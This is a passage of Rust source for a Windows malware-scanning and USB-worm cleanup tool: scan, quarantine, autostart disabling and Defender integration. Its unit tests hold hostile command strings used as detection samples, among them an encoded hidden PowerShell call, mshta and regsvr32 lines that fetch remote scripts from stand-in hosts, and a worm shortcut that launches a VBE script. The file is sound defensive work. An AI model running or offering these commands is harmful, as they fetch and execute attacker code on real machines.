            matches!(unsafe { GetDriveTypeW(w.as_ptr()) }, 2 | 3)
        })
        .map(PathBuf::from)
        .collect()
}

/// Finds and removes USB shortcut worms on every flash drive / external disk and makes the
/// folders they hid visible again. Returns the number of malicious files removed.
pub fn clean_usb(r: &mut Report) -> u32 {
    let roots = usb_roots();
    if roots.is_empty() {
        r.log("   No flash drive / external disk connected.");
        return 0;
    }
    let mut removed = 0;
    for root in roots {
        let drive = root.display().to_string();
        let Ok(rd) = fs::read_dir(&root) else { continue };
        let entries: Vec<PathBuf> = rd.flatten().map(|e| e.path()).collect();
        let mut bad: Vec<(PathBuf, String)> = vec![];
        let mut names: Vec<String> = vec![];
        for p in entries.iter().filter(|p| p.is_file()) {
            let name = file_name(&p.to_string_lossy());
            if name.ends_with(".lnk") {
                let bytes: Vec<u8> = fs::File::open(p).map(|f| f.take(256 * 1024).bytes().flatten().collect()).unwrap_or_default();
                let text = binary_strings(&bytes);
                if worm_shortcut(&text) {
                    bad.push((p.clone(), "worm shortcut (starts a hidden script / program)".into()));
                    names.extend(referenced_files(&text));
                }
            } else if name == "autorun.inf" {
                let text = fs::read_to_string(p).unwrap_or_default().to_lowercase();
                if text.contains("open=") || text.contains("shellexecute=") || text.contains("shell\\") {
                    bad.push((p.clone(), "autorun.inf that starts a program".into()));
                    names.extend(referenced_files(&text));
                }
            } else if encoded_script(p) {
                bad.push((p.clone(), "encoded script on the drive root (USB worm)".into()));
            }
        }
        for n in names {
            let p = root.join(&n);
            if p.is_file() && !bad.iter().any(|(b, _)| b == &p) {
                bad.push((p, "program / script started by the worm shortcuts".into()));
            }
        }
        if bad.is_empty() {
            r.log(format!("   {drive} clean"));
            continue;
        }
        r.put(Kind::Fail, format!("USB WORM on {drive}: {} malicious file(s)", bad.len()));
        for (p, why) in &bad {
            let sha = sha256_file(p).map(|h| to_hex(&h)).unwrap_or_default();
            match quarantine(p, &sha, why) {
                Some(_) => {
                    r.fix(format!("Removed from {drive}: {} ({why})", file_name(&p.to_string_lossy())));
                    removed += 1;
                }
                None => r.manual(format!("Delete this file from the flash drive by hand: {}", p.display())),
            }
        }
        // The worm hid the real folders / files (hidden + system): show them again.
        let mut shown = 0;
        for p in &entries {
            let name = file_name(&p.to_string_lossy());
            if ["system volume information", "$recycle.bin", "recycler", "recycled"].contains(&name.as_str()) || !p.exists() {
                continue;
            }
            let w = wide(p);
            let attrs = unsafe { GetFileAttributesW(w.as_ptr()) };
            if attrs != INVALID_FILE_ATTRIBUTES && attrs & (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM) != 0 {
                let clean = attrs & !(FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
                if unsafe { SetFileAttributesW(w.as_ptr(), clean) } != 0 {
                    shown += 1;
                }
            }
        }
        if shown > 0 {
            r.fix(format!("{shown} folder(s) / file(s) the worm had hidden on {drive} are visible again"));
        }
        r.manual(format!(
            "A USB worm was on {drive}: the PC it came from is infected too - run WinTool VIRUS SCAN there before using the flash drive on it again."
        ));
    }
    removed
}

// ---------------------------------------------------------------- scan

struct Item {
    path: String,
    score: u32,
    reasons: Vec<String>,
    sha: Option<[u8; 32]>,
    hash_hit: bool,
}

fn key(p: &str) -> String {
    native_path(p).to_string_lossy().to_lowercase()
}

/// Runs the WinTool scan into `r`. Returns the number of malware files / entries dealt with.
pub fn run_into(r: &mut Report, internet: bool) -> u32 {
    let (db, source) = ui::spin("Loading malware databases", || load_db(internet));
    if db.is_empty() {
        r.put(Kind::Warn, "No malware database (no internet and no WinTool-db folder next to WinTool.exe) - behaviour checks only.");
    } else {
        r.log(format!(
            "   Databases ({source}): {} malware hashes, {} file-name patterns, {} botnet servers",
            db.hashes.len(),
            db.names.len(),
            db.ips.len() + db.domains.len()
        ));
    }
    let win = windir().to_string_lossy().to_string();
    let usb_removed = clean_usb(r);
    let facts = parse_facts(&ui::spin("Reading programs, services, startup entries and tasks", || ps(PROBE)));

    // Candidate files: running programs, autostart targets, user folders.
    let auto_files: Vec<(Autostart, Option<String>)> = facts
        .autostart
        .iter()
        .map(|a| (a.clone(), if a.kind == "SVC" || a.kind == "DRV" { image_file(&a.command) } else { startup_file(&a.command) }))
        .collect();
    let files = ui::spin("Listing files", || {
        let mut out: Vec<PathBuf> = vec![];
        let mut seen = HashSet::new();
        for p in facts.procs.iter().map(|(_, p)| p.as_str()).chain(auto_files.iter().filter_map(|(_, f)| f.as_deref())) {
            let pb = native_path(p);
            if pb.is_file() && seen.insert(pb.to_string_lossy().to_lowercase()) {
                out.push(pb);
            }
        }
        for (dir, depth, scripts) in roots() {
            walk(&dir, depth, scripts, &mut out, &mut seen);
        }
        out
    });
    r.log(format!("   {} files checked", files.len()));

    // Hashes and path rules
    let hashed = ui::spin("Checking files (hashes, names)", || files.iter().map(|p| (p.to_string_lossy().to_string(), sha256_file(p))).collect::<Vec<_>>());
    let mut items: HashMap<String, Item> = HashMap::new();
    for (path, sha) in hashed {
        let mut it = Item { path: path.clone(), score: 0, reasons: vec![], sha, hash_hit: false };
        if let Some(h) = sha.filter(|h| db.hashes.contains(h)) {
            it.score += MALWARE;
            it.hash_hit = true;
            it.reasons.push(match db.named.get(&h) {
                Some(n) => format!("known malware: {n} (signature-base)"),
                None => "known malware (hash in the malicious-hash list)".to_string(),
            });
        }
        for (s, why) in path_findings(&path, &win).into_iter().chain(name_findings(&path, &db.names)) {
            it.score += s;
            it.reasons.push(why);
        }
        if !in_dir(&path, &win) && encoded_script(Path::new(&path)) {
            it.score += MALWARE;
            it.reasons.push("encoded script (Microsoft Script Encoder) - malware hides its code this way".to_string());
        }
        items.insert(path.to_lowercase(), it);
    }

    // Autostart command lines and locations
    let mut bad_entries: Vec<(Autostart, u32, Vec<String>)> = vec![];
    for (a, f) in &auto_files {
        let found = command_findings(&expand_env(&a.command));
        if !found.is_empty() {
            let score = found.iter().map(|x| x.0).sum();
            bad_entries.push((a.clone(), score, found.into_iter().map(|x| x.1).collect()));
        }
        if let Some(f) = f {
            if let (Some(it), Some((s, why))) = (items.get_mut(&key(f)), location_score(f)) {
                it.score += s;
                it.reasons.push(format!("{why} ({})", a.kind));
            }
        }
    }

    // Botnet / C2 connections
    for (ip, pid) in connections() {
        if !db.ips.contains(&ip) {
            continue;
        }
        if let Some(it) = facts.procs.iter().find(|(p, _)| *p == pid).and_then(|(_, exe)| items.get_mut(&key(exe))) {
            it.score += MALWARE;
            it.reasons.push(format!("connected to a known botnet / malware server {ip}"));
        }
    }
    let c2_dns: Vec<&String> = facts.dns.iter().filter(|d| db.domains.contains(*d)).collect();

    // Signed software is exempt from behaviour rules (not from hash matches).
    let scored: Vec<String> = items.values().filter(|i| i.score > 0).map(|i| i.path.clone()).collect();
    let sigs = ui::spin("Checking digital signatures", || signatures(&scored));
    let signed = |p: &str| sigs.get(&p.to_lowercase()).is_some_and(|(s, _)| s == "Valid");

    let mut malware: Vec<&Item> = vec![];
    let mut suspicious: Vec<&Item> = vec![];
    for it in items.values() {
        if it.score == 0 {
            continue;
        }
        if signed(&it.path) {
            // Signed software: behaviour rules do not apply; a hash hit on a signed file is
            // often a legitimate tool that was also abused (remote access, admin tools).
            if it.hash_hit {
                suspicious.push(it);
            }
            continue;
        }
        if it.score >= MALWARE {
            malware.push(it);
        } else if it.score >= SUSPICIOUS {
            suspicious.push(it);
        }
    }
    malware.sort_by(|a, b| a.path.cmp(&b.path));
    suspicious.sort_by(|a, b| a.path.cmp(&b.path));

    let mut dealt = 0;
    for it in &malware {
        r.put(Kind::Fail, format!("MALWARE: {}", it.path));
        for why in &it.reasons {
            r.log(format!("     - {why}"));
        }
        if in_dir(&it.path, &win) {
            r.put(Kind::Warn, "     inside the Windows folder - left to Defender and SFC");
            r.manual(format!("Malware found in a protected place: {} - run a Defender FULL scan and SFC.", it.path));
            continue;
        }
        let lower = it.path.to_lowercase();
        stop_processes(r, &facts, &lower);
        for (a, f) in &auto_files {
            // Started directly, or through a host: wscript "C:\...\x.vbe", rundll32 x.dll ...
            if f.as_deref().is_some_and(|f| key(f) == lower) || expand_env(&a.command).to_lowercase().contains(&lower) {
                disable_autostart(r, a);
            }
        }
        let sha = it.sha.map(|h| to_hex(&h)).unwrap_or_default();
        match quarantine(Path::new(&it.path), &sha, &it.reasons.join("; ")) {
            Some(true) => {
                r.fix(format!("Malware quarantined: {}", it.path));
                dealt += 1;
            }
            Some(false) => {
                r.fix(format!("Malware quarantined (in use - removed at the next restart): {}", it.path));
                r.restart_needed = true;
                dealt += 1;
            }
            None => {
                r.put(Kind::Fail, format!("     could not quarantine {}", it.path));
                r.manual(format!("Delete this malware by hand or with a Defender full scan: {}", it.path));
            }
        }
    }
    for (a, score, why) in &bad_entries {
        if *score >= MALWARE {
            r.put(Kind::Fail, format!("MALICIOUS STARTUP ENTRY ({}): {}", a.kind, a.command));
            for w in why {
                r.log(format!("     - {w}"));
            }
            disable_autostart(r, a);
            if let Some(script) = script_in(&expand_env(&a.command)).filter(|s| !in_dir(s, &win)) {
                stop_processes(r, &facts, &script.to_lowercase());
                let file = native_path(&script);
                if file.is_file() {
                    match quarantine(&file, "", &why.join("; ")) {
                        Some(_) => r.fix(format!("Malicious script quarantined: {script}")),
                        None => r.manual(format!("Delete this malicious script by hand: {script}")),
                    }
                }
            }
            dealt += 1;
        } else {
            r.put(Kind::Warn, format!("Suspicious startup entry ({}): {}", a.kind, a.command));
            r.manual(format!("Check this startup entry - remove it if you do not know it: {} ({})", a.command, why.join("; ")));
        }
    }
    for it in &suspicious {
        r.put(Kind::Warn, format!("Suspicious: {}", it.path));
        for why in &it.reasons {
            r.log(format!("     - {why}"));
        }
        let who = sigs.get(&it.path.to_lowercase()).filter(|(st, _)| st == "Valid").map(|(_, s)| format!(" (signed: {s})")).unwrap_or_default();
        r.manual(format!("Suspicious file (not removed){who}: {} - check it on virustotal.com and delete it if you did not install it.", it.path));
    }
    for d in &c2_dns {
        r.put(Kind::Warn, format!("This PC recently contacted a known malware server: {d}"));
    }
    if !c2_dns.is_empty() {
        r.manual("The PC contacted known malware servers: run a Defender FULL scan and change your passwords from another, clean device.");
    }
    if malware.is_empty() && suspicious.is_empty() && bad_entries.is_empty() && c2_dns.is_empty() && usb_removed == 0 {
        r.put(Kind::Ok, "WinTool scan: no malware found.");
    }
    dealt + usb_removed
}

/// Stops every process whose program is `lower_path` or whose command line mentions it
/// (wscript / cscript / rundll32 hosting a malicious file).
fn stop_processes(r: &mut Report, facts: &Facts, lower_path: &str) {
    let pids: HashSet<u32> = facts
        .procs
        .iter()
        .filter(|(_, e)| key(e) == lower_path)
        .map(|(p, _)| *p)
        .chain(facts.cmdlines.iter().filter(|(_, c)| c.contains(lower_path)).map(|(p, _)| *p))
        .collect();
    for pid in pids {
        if cmd_quiet(&format!("taskkill /PID {pid} /F")) {
            r.log(format!("     process {pid} stopped"));
        }
    }
}

fn disable_autostart(r: &mut Report, a: &Autostart) {
    match a.kind {
        "RUN" => {
            if reg_delete(&a.key, &a.name) {
                r.fix(format!("Startup entry \"{}\" removed (was: {})", a.name, a.command));
            }
        }
        "TASK" => {
            let script = format!(
                "$s = New-Object -ComObject Schedule.Service; $s.Connect(); $t = $s.GetFolder('\\').GetTask({}); $t.Enabled = $false",
                ps_quote(&a.key)
            );
            if ps_ok(&script) {
                r.fix(format!("Scheduled task {} disabled (was: {})", a.key, a.command));
            }
        }
        "SVC" | "DRV" => {
            cmd_quiet(&format!("sc stop \"{}\"", a.key));
            if cmd_quiet(&format!("sc config \"{}\" start= disabled", a.key)) {
                r.fix(format!("Service {} stopped and disabled (was: {})", a.key, a.command));
                r.restart_needed = true;
            }
        }
        _ => {}
    }
}

// ---------------------------------------------------------------- menu

const ITEMS: [&str; 4] = [
    "Scan now (WinTool scanner + Defender quick scan)",
    "Clean flash drives (USB shortcut virus)",
    "Defender FULL scan (1-3 hours)",
    "Quarantine - restore a file",
];

pub fn menu() {
    while let Some(i) = ui::menu("Virus scan", &ITEMS, "Back", false) {
        ui::header(ITEMS[i]);
        match i {
            0 => scan_now(),
            1 => usb_now(),
            2 => defender_full(),
            _ => restore_menu(),
        }
        pause();
    }
}

fn scan_now() {
    let mut r = Report::new();
    r.note(format!("WinTool {} - virus scan report  (by {}, {})", ui::VERSION, ui::AUTHOR, ui::SITE));
    r.put(Kind::Plain, format!("  Date:   {}", now_str()));
    r.put(Kind::Plain, format!("  System: {}", version_str()));
    let internet = internet_ok();
    ui::set_unattended(true);
    safety::checkpoint();
    r.step("[1/2] WinTool scanner");
    run_into(&mut r, internet);
    r.step("[2/2] Windows Defender");
    crate::fullcheck::defender_scan(&mut r, internet);
    ui::set_unattended(false);
    r.print_steps();
    r.save("WinTool-virus-report.txt");
    if r.restart_needed && ui::ask("Restart now to finish removing malware?", true) {
        cmd("Restarting in 10 seconds", "shutdown /r /t 10");
    }
}

fn usb_now() {
    println!("\n  Insert the flash drives / external disks to clean, then press Enter.");
    pause();
    let mut r = Report::new();
    r.note(format!("WinTool {} - flash drive cleanup report  (by {}, {})", ui::VERSION, ui::AUTHOR, ui::SITE));
    r.put(Kind::Plain, format!("  Date:   {}", now_str()));
    let n = clean_usb(&mut r);
    ui::result(true, &if n > 0 { format!("{n} malicious file(s) removed from the flash drives.") } else { "No USB worm found.".to_string() });
    r.print_steps();
    r.save("WinTool-usb-report.txt");
}

fn defender_full() {
    let mpcmd = crate::fullcheck::program_files().join(r"Windows Defender\MpCmdRun.exe");
    if !mpcmd.is_file() {
        ui::fail("Windows Defender is not available on this PC.");
        return;
    }
    println!("\n  A full scan reads every file: 1-3 hours. Keep the PC on.");
    if !confirm("Start the Defender full scan?") {
        return;
    }
    let code = ui::spin("Defender full scan", || Command::new(&mpcmd).args(["-Scan", "-ScanType", "2"]).output().ok().and_then(|o| o.status.code()));
    match code {
        Some(0) => ui::ok("No threats found."),
        Some(2) => ui::warn("Threats found - Defender removed / quarantined them (Windows Security -> Protection history)."),
        _ => ui::fail("The scan could not run."),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn databases() {
        let files = vec![
            ("malicious-hash-aa.txt".to_string(), format!("{}\n", "ab".repeat(32))),
            ("hash-iocs.txt".to_string(), format!("# c\n{};Evil RAT\n{};short\n", "cd".repeat(32), "ef".repeat(16))),
            ("filename-iocs.txt".to_string(), "\\\\evil\\.exe;80\n\\\\tmp\\.exe;60;(?i)\\\\Temp\\\\App\nbad[regex;70\n".to_string()),
            ("c2-iocs.txt".to_string(), "bad.example.com\n1.2.3.4\n".to_string()),
            ("feodo.txt".to_string(), "# x\n5.6.7.8\n".to_string()),
        ];
        let db = parse_db(&files);
        assert_eq!(db.hashes.len(), 2);
        assert_eq!(db.named.get(&hex32(&"cd".repeat(32)).unwrap()).map(String::as_str), Some("Evil RAT"));
        assert_eq!(db.names.len(), 2); // the broken regex is skipped
        assert!(db.ips.contains("1.2.3.4") && db.ips.contains("5.6.7.8") && db.domains.contains("bad.example.com"));
        assert_eq!(name_findings(r"C:\Users\x\AppData\evil.exe", &db.names).len(), 1);
        assert!(name_findings(r"C:\Users\x\AppData\Local\Temp\App1234\tmp.exe", &db.names).is_empty()); // false-positive rule
    }

    #[test]
    fn literals() {
        assert_eq!(required_literal(r"\\usbclass\.sys").as_deref(), Some(r"\usbclass.sys"));
        assert_eq!(required_literal(r"(?i)\\AppData\\Local\\Temp\\App[a-z0-9]{4}\.tmp\.exe").as_deref(), Some(r"\appdata\local\temp\app"));
        assert_eq!(required_literal(r"(\\a\.exe|\\b\.exe)"), None);
        assert_eq!(required_literal(r"\\x\.exe|\\y\.exe"), None);
        assert_eq!(required_literal(r"\\Temp\\[a-z]{8}\.exe").as_deref(), Some(r"\temp\"));
        assert_eq!(required_literal(r"svchosts?\.exe").as_deref(), Some("svchost"));
        assert_eq!(required_literal(r"\\d\d\.exe").as_deref(), Some(".exe"));
        assert_eq!(required_literal(r"\\ab{2,3}xyz\.dll").as_deref(), Some("xyz.dll"));
    }

    #[test]
    fn path_rules() {
        let w = r"C:\Windows";
        assert_eq!(path_findings(r"C:\Users\x\AppData\Roaming\svchost.exe", w)[0].0, 90);
        assert!(path_findings(r"C:\Windows\System32\svchost.exe", w).is_empty());
        assert_eq!(path_findings(r"C:\Users\x\Downloads\invoice.pdf.exe", w)[0].0, 80);
        assert!(path_findings(r"C:\Users\x\Downloads\setup.1.2.exe", w).is_empty());
    }

    #[test]
    fn command_rules() {
        assert!(command_findings("powershell -w hidden -enc SQBFAFgA").iter().any(|f| f.0 >= MALWARE));
        assert!(command_findings(r#"mshta "https://evil/x.hta""#).iter().any(|f| f.0 >= MALWARE));
        assert!(command_findings("regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll").iter().any(|f| f.0 >= MALWARE));
        assert!(command_findings(r#""C:\Program Files\App\app.exe" /min"#).is_empty());
        assert!(command_findings(r"powershell.exe -ExecutionPolicy Bypass -File C:\Tools\backup.ps1").is_empty());
        assert_eq!(location_score(r"C:\Users\x\AppData\Local\Temp\a.exe").map(|x| x.0), Some(70));
        assert_eq!(location_score(r"C:\Program Files\App\a.exe"), None);
    }

    #[test]
    fn netstat_and_manifest() {
        let ns = "  TCP    192.168.1.5:50000   5.6.7.8:443   ESTABLISHED   1234\n  TCP    0.0.0.0:135   0.0.0.0:0   LISTENING   900\n  UDP    0.0.0.0:5353   *:*   2000\n  TCP    [::1]:5000   [::1]:49000   HERGESTELLT   77\n";
        assert_eq!(parse_netstat(ns), vec![("5.6.7.8".to_string(), 1234)]);
        let m = parse_manifest("1763500000123|C:\\Users\\x\\a.exe|abcd|known malware|18.11.2026 10:00\r\ngarbage\r\n");
        assert_eq!(m.len(), 1);
        assert_eq!(m[0].original, "C:\\Users\\x\\a.exe");
    }

    /// Bytes shaped like the real worm shortcut found on a flash drive (UTF-16 strings).
    fn worm_lnk() -> Vec<u8> {
        let mut b = vec![0x4c, 0, 0, 0, 1, 0x14, 2, 0];
        b.extend_from_slice(b"\x00\x10Windows\x00system32\x00cmd.exe\x00\x01");
        for s in ["/c start lzfxbacbfi.vbe&start explorer Apps&exit", "%SystemRoot%\\System32\\shell32.dll"] {
            b.extend(s.encode_utf16().flat_map(|u| u.to_le_bytes()));
            b.extend_from_slice(&[0, 0, 7]);
        }
        b
    }

    #[test]
    fn usb_worm() {
        let text = binary_strings(&worm_lnk());
        assert!(text.contains("start lzfxbacbfi.vbe"), "{text}");
        assert!(worm_shortcut(&text));
        assert_eq!(referenced_files(&text), vec!["lzfxbacbfi.vbe".to_string()]);
        // an ordinary shortcut to a document is not a worm
        let mut ok = vec![0x4c, 0, 0, 0];
        ok.extend("D:\\Docs\\report.docx".encode_utf16().flat_map(|u| u.to_le_bytes()));
        assert!(!worm_shortcut(&binary_strings(&ok)));
        let inf = "[autorun]\r\nopen=wscript.exe //B data.vbs\r\nicon=x.ico".to_lowercase();
        assert!(referenced_files(&inf).contains(&"data.vbs".to_string()));
    }

    #[test]
    fn script_rules() {
        assert!(command_findings(r#"wscript.exe //B "C:\Users\x\AppData\Local\Temp\lzfxbacbfi.vbe""#).iter().any(|f| f.0 >= MALWARE));
        assert!(command_findings(r#"wscript.exe //B C:\Users\x\AppData\Roaming\up.vbs"#).iter().any(|f| f.0 == 80));
        assert!(command_findings(r#"wscript.exe "C:\Program Files\Vendor\tool.vbs""#).is_empty());
        assert_eq!(script_in(r#"wscript //B "C:\Users\a b\x.js" arg"#).as_deref(), Some(r"C:\Users\a b\x.js"));
        let dir = std::env::temp_dir().join("wintool-enc-test");
        let _ = fs::create_dir_all(&dir);
        let enc = dir.join("a.vbe");
        fs::write(&enc, "#@~^CJ8EAA==-gD0D%+t&M%!fWHcAX2").unwrap();
        let plain = dir.join("b.vbs");
        fs::write(&plain, "MsgBox \"hi\"").unwrap();
        let notscript = dir.join("c.txt");
        fs::write(&notscript, "#@~^ in a text file").unwrap();
        assert!(encoded_script(&enc));
        assert!(!encoded_script(&plain));
        assert!(!encoded_script(&notscript));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn facts() {
        let f = parse_facts("PROC|42|C:\\a.exe\nRUN|Registry::HKLM\\Run|Upd|C:\\b.exe -x\nTASK|\\Evil|powershell.exe|-enc AAA\nDNS|Bad.Example.com\nDONE|\n");
        assert_eq!(f.procs, vec![(42, "C:\\a.exe".to_string())]);
        assert_eq!(f.autostart.len(), 2);
        assert_eq!(f.autostart[1].command, "\"powershell.exe\" -enc AAA");
        assert_eq!(f.dns, vec!["bad.example.com".to_string()]);
    }
}
